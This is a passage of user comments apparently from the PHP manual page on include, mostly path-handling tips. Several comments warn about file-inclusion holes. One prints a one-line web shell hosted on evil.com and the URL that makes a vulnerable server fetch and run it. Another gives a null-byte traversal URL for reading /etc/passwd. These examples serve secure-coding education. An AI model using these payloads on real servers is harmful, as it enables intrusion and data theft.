</code></div>
  </div>
 </div>
  <div class="note" id="120069">  <div class="votes">
    <div id="Vu120069">
    <a href="/manual/vote-note.php?id=120069&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd120069">
    <a href="/manual/vote-note.php?id=120069&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V120069" title="69% like this...">
    13
    </div>
  </div>
  <a href="#120069" class="name">
  <strong class="user"><em>John Carty</em></strong></a><a class="genanchor" href="#120069"> &para;</a><div class="date" title="2016-10-20 08:29"><strong>1 year ago</strong></div>
  <div class="text" id="Hcom120069">
<div class="phpcode"><code><span class="html">
Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br /><br />As example #3 points out, it is possible to include a php file from a remote server.<br /><br />The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.&nbsp; Suppose you have an example.php with code:<br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// Bad Code<br /></span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'path'</span><span class="keyword">];<br />include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">'example-config-file.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />As a programmer, you might expect the user to browse to the path that you specify.<br /><br />However, it opens up an RFI vulnerability.&nbsp; To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br /><br />evil.txt<br /><span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'command'</span><span class="keyword">]);</span><span class="default">?&gt;<br /></span><br />It is a text file so it would not be processed on my server but on the target/victim server.&nbsp; I would browse to:<br />h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br /><br />The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.&nbsp; In this case, it is whoami.&nbsp; I ended the path variable with a %00, which is the null character.&nbsp; The original include statement in the example.php would ignore the rest of the line.&nbsp; It should tell me who the web server is running as.<br /><br />Please use proper input validation if you use variables in an include statement.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="107685">  <div class="votes">
    <div id="Vu107685">
    <a href="/manual/vote-note.php?id=107685&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd107685">
    <a href="/manual/vote-note.php?id=107685&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V107685" title="60% like this...">
    22
    </div>
  </div>
  <a href="#107685" class="name">
  <strong class="user"><em>Anon</em></strong></a><a class="genanchor" href="#107685"> &para;</a><div class="date" title="2012-02-26 06:31"><strong>5 years ago</strong></div>
  <div class="text" id="Hcom107685">
<div class="phpcode"><code><span class="html">
I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br />Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="118083">  <div class="votes">
    <div id="Vu118083">
    <a href="/manual/vote-note.php?id=118083&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd118083">
    <a href="/manual/vote-note.php?id=118083&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V118083" title="60% like this...">
    9
    </div>
  </div>
  <a href="#118083" class="name">
  <strong class="user"><em>error17191 at gmail dot com</em></strong></a><a class="genanchor" href="#118083"> &para;</a><div class="date" title="2015-10-01 09:39"><strong>2 years ago</strong></div>
  <div class="text" id="Hcom118083">
<div class="phpcode"><code><span class="html">
When including a file using its name directly without specifying we are talking about the current working directory, i.e. saying (include "file") instead of ( include "./file") . PHP will search first in the current working directory (given by getcwd() ) , then next searches for it in the directory of the script being executed (given by __dir__).<br />This is an example to demonstrate the situation :<br />We have two directory structure :<br />-dir1<br />----script.php<br />----test<br />----dir1_test<br />-dir2<br />----test<br />----dir2_test<br /><br />dir1/test contains the following text :<br />This is test in dir1<br />dir2/test contains the following text:<br />This is test in dir2<br />dir1_test contains the following text:<br />This is dir1_test<br />dir2_test contains the following text:<br />This is dir2_test<br /><br />script.php contains the following code:<br /><span class="default">&lt;?php<br /><br /></span><span class="keyword">echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Changing current working directory to dir2'</span><span class="keyword">;<br /></span><span class="default">chdir</span><span class="keyword">(</span><span class="string">'../dir2'</span><span class="keyword">);<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Directory of the current calling script: ' </span><span class="keyword">. </span><span class="default">__DIR__</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'Current working directory: ' </span><span class="keyword">. </span><span class="default">getcwd</span><span class="keyword">();<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "dir2_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'dir2_test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "dir1_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />include </span><span class="string">'dir1_test'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />echo </span><span class="string">'including "./dir1_test" ...'</span><span class="keyword">;<br />echo </span><span class="string">'&lt;br /&gt;'</span><span class="keyword">;<br />(@include </span><span class="string">'./dir1_test'</span><span class="keyword">) or die(</span><span class="string">'couldn\'t include this file '</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>The output of executing script.php is :<br /><br />Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir1<br />including "test" ...<br />This is test in dir1<br />Changing current working directory to dir2<br />Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1<br />Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir2<br />including "test" ...<br />This is test in dir2<br />including "dir2_test" ...<br />This is dir2_test<br />including "dir1_test" ...<br />This is dir1_test<br />including "./dir1_test" ...<br />couldn't include this file</span>
</code></div>
  </div>
 </div>
  <div class="note" id="115827">  <div class="votes">
    <div id="Vu115827">
    <a href="/manual/vote-note.php?id=115827&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd115827">
    <a href="/manual/vote-note.php?id=115827&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V115827" title="61% like this...">
    6
    </div>
  </div>
  <a href="#115827" class="name">
  <strong class="user"><em>Ray.Paseur often uses Gmail</em></strong></a><a class="genanchor" href="#115827"> &para;</a><div class="date" title="2014-09-30 11:05"><strong>3 years ago</strong></div>
  <div class="text" id="Hcom115827">
<div class="phpcode"><code><span class="html">
It's worth noting that PHP provides an OS-context aware constant called DIRECTORY_SEPARATOR.&nbsp; If you use that instead of slashes in your directory paths your scripts will be correct whether you use *NIX or (shudder) Windows.&nbsp; (In a semi-related way, there is a smart end-of-line character, PHP_EOL)<br /><br />Example:<br /><span class="default">&lt;?php <br />$cfg_path<br /></span><span class="keyword">= </span><span class="string">'includes'<br /></span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR<br /></span><span class="keyword">. </span><span class="string">'config.php'<br /></span><span class="keyword">;<br />require_once(</span><span class="default">$cfg_path</span><span class="keyword">);</span>
</span>
</code></div>
  </div>
 </div>
  <div class="note" id="116522">  <div class="votes">
    <div id="Vu116522">
    <a href="/manual/vote-note.php?id=116522&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd116522">
    <a href="/manual/vote-note.php?id=116522&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V116522" title="59% like this...">
    9
    </div>
  </div>
  <a href="#116522" class="name">
  <strong class="user"><em>Rash</em></strong></a><a class="genanchor" href="#116522"> &para;</a><div class="date" title="2015-01-17 05:55"><strong>2 years ago</strong></div>
  <div class="text" id="Hcom116522">
<div class="phpcode"><code><span class="html">
If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment"># index.php<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'what'</span><span class="keyword">, </span><span class="string">'ever'</span><span class="keyword">);<br />include </span><span class="string">'includeFile.php'</span><span class="keyword">;<br /><br /></span><span class="comment"># includeFile.php<br /><br />// check if what is defined and die if not<br /><br /></span><span class="default">?&gt;<br /></span><br />The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at "/usr/share/nginx/html", keep the include files in "/usr/share/nginx/src".<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment"># index.php (in document root (/usr/share/nginx/html))<br /><br /></span><span class="keyword">include </span><span class="default">__DIR__ </span><span class="keyword">. </span><span class="string">'/../src/includeFile.php'</span><span class="keyword">;<br /><br /></span><span class="default">?&gt;<br /></span><br />Since user can't type 'your.site/../src/includeFile.php', your includeFile(s) would not be accessible to the user directly.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="83066">  <div class="votes">
    <div id="Vu83066">
    <a href="/manual/vote-note.php?id=83066&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd83066">
    <a href="/manual/vote-note.php?id=83066&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V83066" title="57% like this...">
    14
    </div>
  </div>
  <a href="#83066" class="name">
  <strong class="user"><em>Rick Garcia</em></strong></a><a class="genanchor" href="#83066"> &para;</a><div class="date" title="2008-05-08 09:38"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom83066">
<div class="phpcode"><code><span class="html">
As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br /><br />----<br /><span class="default">&lt;?php </span><span class="comment">// prepend.php - autoprepended at the top of your tree<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'MAINDIR'</span><span class="keyword">,</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/'</span><span class="keyword">);<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'DL_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'downloads/'</span><span class="keyword">);<br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'LIB_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'lib/'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>----<br /><br />and so on. This way, the files in your framework will only have to issue statements such as this:<br /><br /><span class="default">&lt;?php<br /></span><span class="keyword">require_once(</span><span class="default">LIB_DIR </span><span class="keyword">. </span><span class="string">'excel_functions.php'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />This also frees you from having to check the include path each time you do an include.<br /><br />If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:<br /><br />--<br /><span class="default">&lt;?php<br /></span><span class="keyword">include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">)) . </span><span class="string">'/prepend.php'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>--<br /><br />This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="102731">  <div class="votes">
    <div id="Vu102731">
    <a href="/manual/vote-note.php?id=102731&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd102731">
    <a href="/manual/vote-note.php?id=102731&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V102731" title="57% like this...">
    9
    </div>
  </div>
  <a href="#102731" class="name">
  <strong class="user"><em>sPlayer</em></strong></a><a class="genanchor" href="#102731"> &para;</a><div class="date" title="2011-03-02 09:09"><strong>6 years ago</strong></div>
  <div class="text" id="Hcom102731">
<div class="phpcode"><code><span class="html">
Sometimes it will be usefull to include a string as a filename<br /><br /><span class="default">&lt;?php<br /><br /></span><span class="comment">//get content<br /></span><span class="default">$cFile </span><span class="keyword">= </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">'crypted.file'</span><span class="keyword">);<br /></span><span class="comment">//decrypt the content<br /></span><span class="default">$content </span><span class="keyword">= </span><span class="default">decrypte</span><span class="keyword">(</span><span class="default">$cFile</span><span class="keyword">);<br /><br /></span><span class="comment">//include this<br /></span><span class="keyword">include(</span><span class="string">"data://text/plain;base64,"</span><span class="keyword">.</span><span class="default">base64_encode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));<br /></span><span class="comment">//or<br /></span><span class="keyword">include(</span><span class="string">"data://text/plain,"</span><span class="keyword">.</span><span class="default">urlencode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));<br /></span><span class="default">?&gt;</span>
</span>
</code></div>
  </div>
 </div>
  <div class="note" id="86527">  <div class="votes">
    <div id="Vu86527">
    <a href="/manual/vote-note.php?id=86527&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd86527">
    <a href="/manual/vote-note.php?id=86527&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V86527" title="54% like this...">
    3
    </div>
  </div>
  <a href="#86527" class="name">
  <strong class="user"><em>Wade.</em></strong></a><a class="genanchor" href="#86527"> &para;</a><div class="date" title="2008-10-22 08:20"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom86527">
<div class="phpcode"><code><span class="html">
If you're doing a lot of dynamic/computed includes (&gt;100, say), then you may well want to know this performance comparison: if the target file doesn't exist, then an @include() is *ten* *times* *slower* than prefixing it with a file_exists() check. (This will be important if the file will only occasionally exist - e.g. a dev environment has it, but a prod one doesn't.)<br /><br />Wade.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="94586">  <div class="votes">
    <div id="Vu94586">
    <a href="/manual/vote-note.php?id=94586&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd94586">
    <a href="/manual/vote-note.php?id=94586&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V94586" title="55% like this...">
    2
    </div>
  </div>
  <a href="#94586" class="name">
  <strong class="user"><em>Chris Bell</em></strong></a><a class="genanchor" href="#94586"> &para;</a><div class="date" title="2009-11-12 05:12"><strong>8 years ago</strong></div>
  <div class="text" id="Hcom94586">
<div class="phpcode"><code><span class="html">
A word of warning about lazy HTTP includes - they can break your server.<br /><br />If you are including a file from your own site, do not use a URL however easy or tempting that may be. If all of your PHP processes are tied up with the pages making the request, there are no processes available to serve the include. The original requests will sit there tying up all your resources and eventually time out.<br /><br />Use file references wherever possible. This caused us a considerable amount of grief (Zend/IIS) before I tracked the problem down.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="81367">  <div class="votes">
    <div id="Vu81367">
    <a href="/manual/vote-note.php?id=81367&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd81367">
    <a href="/manual/vote-note.php?id=81367&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V81367" title="54% like this...">
    2
    </div>
  </div>
  <a href="#81367" class="name">
  <strong class="user"><em>uramihsayibok, gmail, com</em></strong></a><a class="genanchor" href="#81367"> &para;</a><div class="date" title="2008-02-24 05:28"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom81367">
<div class="phpcode"><code><span class="html">
I have a need to include a lot of files, all of which are contained in one directory. Support for things like <span class="default">&lt;?php </span><span class="keyword">include_once </span><span class="string">'dir/*.php'</span><span class="keyword">; </span><span class="default">?&gt;</span> would be nice, but it doesn't exist.<br /><br />Therefore I wrote this quick function (located in a file automatically included by auto_prepend_file):<br /><span class="default">&lt;?php<br /><br /></span><span class="keyword">function </span><span class="default">include_all_once </span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) {<br />&nbsp; &nbsp; foreach (</span><span class="default">glob</span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) as </span><span class="default">$file</span><span class="keyword">) { </span><span class="comment">// remember the { and } are necessary!<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="keyword">include </span><span class="default">$file</span><span class="keyword">;<br />&nbsp; &nbsp; }<br />}<br /><br /></span><span class="comment">// used like<br /></span><span class="default">include_all_once</span><span class="keyword">(</span><span class="string">'dir/*.php'</span><span class="keyword">);<br /><br /></span><span class="default">?&gt;<br /></span>A fairly obvious solution. It doesn't deal with relative file paths though; you still have to do that yourself.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="120925">  <div class="votes">
    <div id="Vu120925">
    <a href="/manual/vote-note.php?id=120925&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd120925">
    <a href="/manual/vote-note.php?id=120925&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V120925" title="100% like this...">
    2
    </div>
  </div>
  <a href="#120925" class="name">
  <strong class="user"><em>ayon at hyurl dot com</em></strong></a><a class="genanchor" href="#120925"> &para;</a><div class="date" title="2017-04-03 06:24"><strong>8 months ago</strong></div>
  <div class="text" id="Hcom120925">
<div class="phpcode"><code><span class="html">
It is also able to include or open a file from a zip file:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="string">"something.zip#script.php"</span><span class="keyword">;<br />echo </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">"something.zip#script.php"</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span>Note that instead of using / or \, open a file from a zip file uses # to separate zip name and inner file's name.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="42906">  <div class="votes">
    <div id="Vu42906">
    <a href="/manual/vote-note.php?id=42906&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd42906">
    <a href="/manual/vote-note.php?id=42906&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V42906" title="50% like this...">
    0
    </div>
  </div>
  <a href="#42906" class="name">
  <strong class="user"><em>durkboek A_T hotmail D_O_T com</em></strong></a><a class="genanchor" href="#42906"> &para;</a><div class="date" title="2004-06-03 04:09"><strong>13 years ago</strong></div>
  <div class="text" id="Hcom42906">
<div class="phpcode"><code><span class="html">
I would like to emphasize the danger of remote includes. For example:<br />Suppose, we have a server A with Linux and PHP 4.3.0 or greater installed which has the file index.php with the following code:<br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// File: index.php<br /></span><span class="keyword">include (</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'id'</span><span class="keyword">].</span><span class="string">".php"</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />This is, of course, not a very good way to program, but i actually found a program doing this.<br /><br />Then, we hava a server B, also Linux with PHP installed, that has the file list.php with the following code:<br /><br /><span class="default">&lt;?php<br /></span><span class="comment">// File: list.php<br /></span><span class="default">$output </span><span class="keyword">= </span><span class="string">""</span><span class="keyword">;<br /></span><span class="default">exec</span><span class="keyword">(</span><span class="string">"ls -al"</span><span class="keyword">,</span><span class="default">$output</span><span class="keyword">);<br />foreach(</span><span class="default">$output </span><span class="keyword">as </span><span class="default">$line</span><span class="keyword">) {<br />echo </span><span class="default">$line </span><span class="keyword">. </span><span class="string">"&lt;br&gt;\n"</span><span class="keyword">;<br />}<br /></span><span class="default">?&gt;<br /></span><br />If index.php on Server A is called like this: <a href="http://server_a/index.php?id=http://server_b/list" rel="nofollow" target="_blank">http://server_a/index.php?id=http://server_b/list</a><br />then Server B will execute list.php and Server A will include the output of Server B, a list of files.<br /><br />But here's the trick: if Server B doesn't have PHP installed, it returns the file list.php to Server A, and Server A executes that file. Now we have a file listing of Server A! <br />I tried this on three different servers, and it allways worked.<br />This is only an example, but there have been hacks uploading files to servers etc.<br /><br />So, allways be extremely carefull with remote includes.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="73148">  <div class="votes">
    <div id="Vu73148">
    <a href="/manual/vote-note.php?id=73148&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd73148">
    <a href="/manual/vote-note.php?id=73148&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V73148" title="47% like this...">
    -1
    </div>
  </div>
  <a href="#73148" class="name">
  <strong class="user"><em>mbread at m-bread dot com</em></strong></a><a class="genanchor" href="#73148"> &para;</a><div class="date" title="2007-02-10 09:23"><strong>10 years ago</strong></div>
  <div class="text" id="Hcom73148">
<div class="phpcode"><code><span class="html">
If you have a problem with "Permission denied" errors (or other permissions problems) when including files, check:<br /><br />1) That the file you are trying to include has the appropriate "r" (read) permission set, and<br />2) That all the directories that are ancestors of the included file, but not of the script including the file, have the appropriate "x" (execute/search) permission set.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="100553">  <div class="votes">
    <div id="Vu100553">
    <a href="/manual/vote-note.php?id=100553&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd100553">
    <a href="/manual/vote-note.php?id=100553&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V100553" title="46% like this...">
    -2
    </div>
  </div>
  <a href="#100553" class="name">
  <strong class="user"><em>joe dot naylor at gmail dot com</em></strong></a><a class="genanchor" href="#100553"> &para;</a><div class="date" title="2010-10-22 02:11"><strong>7 years ago</strong></div>
  <div class="text" id="Hcom100553">
<div class="phpcode"><code><span class="html">
Be very careful with including files based on user inputed data.&nbsp; For instance, consider this code sample:<br /><br />index.php:<br /><span class="default">&lt;?php<br />$page </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'page'</span><span class="keyword">];<br />if (</span><span class="default">file_exists</span><span class="keyword">(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">))<br />{<br />&nbsp;&nbsp; include(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">);<br />}<br /></span><span class="default">?&gt;<br /></span><br />Then go to URL:<br />index.php?page=/../../../../../../etc/passwd%00.html<br /><br />file_exists() will return true, your passwd file will be included and since it's not php code it will be output directly to the browser.<br /><br />Of course the same vulnerability exists if you are reading a file to display, as in a templating engine.<br /><br />You absolutely have to sanitize any input string that will be used to access the filesystem, you can't count on an absolute path or appended file extension to secure it.&nbsp; Better yet, know exactly what options you can accept and accept only those options.</span>
</code></div>
  </div>
 </div>
  <div class="note" id="94392">  <div class="votes">
    <div id="Vu94392">
    <a href="/manual/vote-note.php?id=94392&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd94392">
    <a href="/manual/vote-note.php?id=94392&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V94392" title="45% like this...">
    -3
    </div>
  </div>
  <a href="#94392" class="name">
  <strong class="user"><em>hyponiq at gmail dot com</em></strong></a><a class="genanchor" href="#94392"> &para;</a><div class="date" title="2009-11-02 02:12"><strong>8 years ago</strong></div>
  <div class="text" id="Hcom94392">
<div class="phpcode"><code><span class="html">
I would like to point out the difference in behavior in IIS/Windows and Apache/Unix (not sure about any others, but I would think that any server under Windows will be have the same as IIS/Windows and any server under Unix will behave the same as Apache/Unix) when it comes to path specified for included files.<br /><br />Consider the following:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />In IIS/Windows, the file is looked for at the root of the virtual host (we'll say C:\Server\Sites\MySite) since the path began with a forward slash.&nbsp; This behavior works in HTML under all platforms because browsers interpret the / as the root of the server.<br /><br />However, Unix file/folder structuring is a little different.&nbsp; The / represents the root of the hard drive or current hard drive partition.&nbsp; In other words, it would basically be looking for root:/Path/To/File.php instead of serverRoot:/Path/To/File.php (which we'll say is /usr/var/www/htdocs).&nbsp; Thusly, an error/warning would be thrown because the path doesn't exist in the root path.<br /><br />I just thought I'd mention that.&nbsp; It will definitely save some trouble for those users who work under Windows and transport their applications to an Unix-based server.<br /><br />A work around would be something like:<br /><span class="default">&lt;?php<br />$documentRoot </span><span class="keyword">= </span><span class="default">null</span><span class="keyword">;<br /><br />if (isset(</span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">])) {<br />&nbsp; &nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">];<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">) || </span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />&nbsp; &nbsp; &nbsp; &nbsp; if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">)) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'/'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; &nbsp; &nbsp; elseif (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'\\'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; }<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; if (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/[^\\/]{1}\\[^\\/]{1}/'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">)) {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/([^\\/]{1})\\([^\\/]{1})/'</span><span class="keyword">, </span><span class="string">'\\1DIR_SEP\\2'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'DIR_SEP'</span><span class="keyword">, </span><span class="string">'\\\\'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />&nbsp; &nbsp; }<br />}<br />else {<br />&nbsp; &nbsp; </span><span class="comment">/**<br />&nbsp; &nbsp;&nbsp; * I usually store this file in the Includes folder at the root of my<br />&nbsp; &nbsp;&nbsp; * virtual host. This can be changed to wherever you store this file.<br />&nbsp; &nbsp;&nbsp; * <br />&nbsp; &nbsp;&nbsp; * Example:<br />&nbsp; &nbsp;&nbsp; * If you store this file in the Application/Settings/DocRoot folder at the<br />&nbsp; &nbsp;&nbsp; * base of your site, you would change this array to include each of those<br />&nbsp; &nbsp;&nbsp; * folders.<br />&nbsp; &nbsp;&nbsp; * 